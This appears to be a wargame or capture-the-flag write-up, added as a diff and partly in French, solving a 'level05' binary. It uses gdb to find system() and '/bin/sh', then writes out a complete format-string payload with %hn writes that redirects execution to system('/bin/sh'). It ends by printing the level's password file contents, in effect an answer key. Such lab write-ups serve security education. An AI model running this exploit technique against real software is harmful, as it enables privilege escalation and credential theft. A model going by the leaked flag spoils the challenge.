@@ -1,0 +1,49 @@
+(gdb) info function system
+All functions matching regular expression "system":
+
+Non-debugging symbols:
+0xf7e6aed0  system
+
+(gdb) info proc map
+process 1851
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+    ...
+	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+
+(gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
+0xf7f897ec
+
+
+on remplace le saved eip par l'address de system() 0xf7e6aed0
+et on met en argument de system() dans la stack l'address de "/bin/sh" 0xf7f897ec
+
+$ echo 'aaaabbbb%10$x%11$x' | ./level05
+    aaaabbbb6161616162626262
+the printf buffer is at offset 10: %10$hn %11$hn
+
+address of "/bin/sh": 0xf7f897ec
+    f7f8 = 63480 = $12
+    97ec = 38892 = $13
+
+address of system(): 0xf7e6aed0
+    f7e6 = 63462 = $10
+    aed0 = 44752 = $11
+
+0xffffd57c <- &system
+    \x7c\xd5\xff\xff
+    \x7e\xd5\xff\xff
+0xffffd584 <- &"/bin/sh"
+    \x84\xd5\xff\xff
+    \x86\xd5\xff\xff
+
+$ echo -e '[EIP second part] [EIP first part] [system() arg second part] [system() arg first part] [display 0x97ec char] %13$hn [display 0xaed0 char] %11$hn [display 0xf7e6 char] %10$hn [display 0xf7f8 char] %12$hn' > /tmp/level05_pcode
+
+$ echo -e '\x7e\xd5\xff\xff\x7c\xd5\xff\xff\x86\xd5\xff\xff\x84\xd5\xff\xff%38876c%13$hn%5860c%11$hn%18710c%10$hn%18c%12$hn' > /tmp/level05_pcode
+
+
+$ cat /tmp/level05_pcode - | ./level05
+    ...
+cat /home/users/level05/.pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
